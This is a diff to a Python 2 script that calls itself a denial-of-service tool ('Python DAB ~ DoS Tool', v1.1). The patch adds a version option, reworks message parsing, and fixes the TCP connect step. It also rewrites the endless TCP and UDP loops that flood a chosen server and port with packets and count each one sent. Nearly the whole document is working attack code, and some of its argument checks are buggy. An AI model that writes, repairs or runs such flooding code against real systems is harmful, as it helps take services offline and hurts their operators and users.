@@ -1,6 +1,7 @@
 #! /usr/bin/env python
 # -*- coding: utf-8 -*-
 """ Python DAB ~ DoS Tool ~ By Wįłłý Fœx : @BlackVikingPro """
+""" Current Version: v1.1 """
 
 """
  Python D.A.B. [ |)3|\|`/ 411 |31T(|-|3z ] ~ DoS Tool ~ By Wįłłý Fœx : @BlackVikingPro
@@ -57,6 +58,7 @@ except ImportError:
 	pass
 """
 
+version = 'v1.1'
 verbose = False # display verbose-level information
 
 def usage():
@@ -111,11 +113,15 @@ if len(sys.argv) == 1:
 	pass
 
 help_args = ['help', '-h', 'h', '--help', '/?', '?']
+version_args = ['--version', '-v', 'version', 'ver']
 try:
 	if sys.argv[1] in help_args:
 		usage()
 		sys.exit()
-		pass
+	elif sys.argv[1] in version_args:
+		warn("Current Version: %s" % version)
+		usage()
+		sys.exit()
 	pass
 except IndexError:
 	pass
@@ -172,6 +178,7 @@ try:
 		_rtype = 'get' # defining the http type is not required.
 		pass
 
+	"""
 	if '-m' in sys.argv:
 		m_option_pos = sys.argv.index('-m')
 		message = sys.argv[(m_option_pos + 1)]
@@ -189,6 +196,16 @@ try:
 
 			message = open('data.txt', 'r').read()
 		pass
+	"""
+	if '-m' in sys.argv:
+		m_option_pos = sys.argv.index('-m')
+		message = sys.argv[(m_option_pos + 1)]
+		pass
+	elif '--message' in sys.argv:
+		m_option_pos = sys.argv.index('--message')
+		message = sys.argv[(m_option_pos + 1)]
+		pass
+	pass
 
 	if ('-v' or '--verbose') in sys.argv:
 		print "Verbose enabled."
@@ -202,19 +219,22 @@ except IndexError:
 	usage()
 	sys.exit()
 except ValueError as v:
-	if '-s' or '--server' not in sys.argv:
+	if ('-s' or '--server') not in sys.argv:
 		error("Error: Server not defined.")
 		usage()
 		sys.exit()
-	elif '-p' or '--port' not in sys.argv:
+	elif ('-p' or '--port') not in sys.argv:
 		error("Error: Port not defined.")
 		usage()
 		sys.exit()
-	elif '-t' or '--type' not in sys.argv:
+	elif ('-t' or '--type') not in sys.argv:
 		error("Error: Type not defined.")
 		usage()
 		sys.exit()
-		pass
+	elif ('-m' or '--message') not in sys.argv:
+		error("Error: Message not defined.")
+		usage()
+		sys.exit()
 	pass
 
 
@@ -244,22 +264,22 @@ def sendpacket(_type, sock, data, server='', port=''):
 	if _type in ('tcp', 'TCP'):
 		try:
 			sock.send(b'%s' % data.encode())
+			return True
 			pass
 		except socket.error as e:
-			print ""
-			error( "%s <!-- Server may be down -->" % e )
+			error( "Couldn't send payload <!-- Server may be down -->" )
 			sock.close()
 			sys.exit()
 		pass
 	elif _type in ('udp', 'UDP'):
 		try:
 			sock.sendto(b'%s' % data, (server, port))
+			return True
 			# sock.sendto(bytes(data, "utf-8"), (server))
 			# sock.sendto(b'%s' % data, (server))
 			pass
 		except socket.error as e:
-			print ""
-			error( "%s <!-- Server may be down -->" % e )
+			error( "Couldn't send payload <!-- Server may be down -->" )
 			sock.close() # clean close
 			sys.exit()
 		pass
@@ -269,34 +289,42 @@ def sendpacket(_type, sock, data, server='', port=''):
 def dos_tcp(server, attack_type, message):
 	warn ( "You've chosen to attack: \033[96m%s\033[93m at port \033[96m%s\033[93m using attack method: \033[96m%s\033[93m." % (server[0], server[1], attack_type) )
 	
-	warn ( "Attacking \033[96m%s\033[95m:\033[96m%s\033[93m now!" % (server[0], server[1]) )
+	warn ( "Attacking \033[96m%s\033[95m:\033[96m%s\033[93m now!" % (server) )
 
 	try:
-		if _type == 'tcp' or 'TCP':
+		if attack_type in ('tcp' or 'TCP'):
 			try:
 				sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # define a tcp socket
+				sock.connect(server)
 				# sock.connect((server))
 			except socket.error as e:
-				# error( e )
-				error("Cannot connect to \033[96m%s\033[95m:\033[96m%s\033[91m. <!-- Server may be down -->" % (server[0], server[1]))
+				# print ( e )
+				error("Cannot connect to \033[96m%s\033[95m:\033[96m%s\033[91m. <!-- Server may be down -->" % (server))
 				sock.close()
 				sys.exit()
 			pass
 		
 		x = 0
 		while True:
-			sendpacket(attack_type, sock, message)
+			if sendpacket(attack_type, sock, message) == True:
+				nums = []
+				nums.append(x + 1)
+				_range = ['_']
 
-			nums = []
-			nums.append(x + 1)
-			_range = ['_']
-
-			for _ in _range:
-				for x in nums:
-					sys.stdout.write( " \r Packet [ %s ] sent! " % x )
-					sys.stdout.flush()
-					# time.sleep(.1)
+				for _ in _range:
+					for x in nums:
+						sys.stdout.write( " \r Packet [ %s ] sent! " % x )
+						sys.stdout.flush()
+						# time.sleep(.1)
+					pass
 				pass
+			else:
+				error("Couldn't send payload <!-- Server may be down -->")
+				sock.close()
+				sys.exit()
+				pass
+
+			
 
 			pass
 		pass
@@ -315,23 +343,39 @@ def dos_tcp(server, attack_type, message):
 def dos_udp(server, attack_type, message):
 	warn ( "You've chosen to attack: \033[96m%s\033[93m at port \033[96m%s\033[93m using attack method: \033[96m%s\033[93m." % (server[0], server[1], attack_type) )
 	
-	warn ( "Attacking \033[96m%s\033[95m:\033[96m%s\033[93m now!" % (server[0], server[1]) )
+	warn ( "Attacking \033[96m%s\033[95m:\033[96m%s\033[93m now!" % (server) )
 
 	try:
-		if _type == 'udp' or 'UDP':
+		if _type in ('udp' or 'UDP'):
 			try:
 				sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # define a udp socket
 				sock.connect((server))
 			except socket.error as e:
 				# error( e )
-				error("Cannot connect to \033[96m%s\033[95m:\033[96m%s\033[91m. <!-- Server may be down -->" % (server[0], server[1]))
+				error("Cannot connect to \033[96m%s\033[95m:\033[96m%s\033[91m. <!-- Server may be down -->" % (server))
 				sock.close()
 				sys.exit()
 			pass
 		
 		x = 0
 		while True:
-			sendpacket(attack_type, sock, message, server[0], server[1])
+			if sendpacket(attack_type, sock, message, server[0], server[1]) == True:
+				nums = []
+				nums.append(x + 1)
+				_range = ['_']
+
+				for _ in _range:
+					for x in nums:
+						sys.stdout.write( " \r Packet [ %s ] sent! " % x )
+						sys.stdout.flush()
+						# time.sleep(.1)
+					pass
+				pass
+			else:
+				error("Couldn't send payload <!-- Server may be down -->")
+				sock.close()
+				sys.exit()
+				pass
 
 			nums = []
 			nums.append(x + 1)
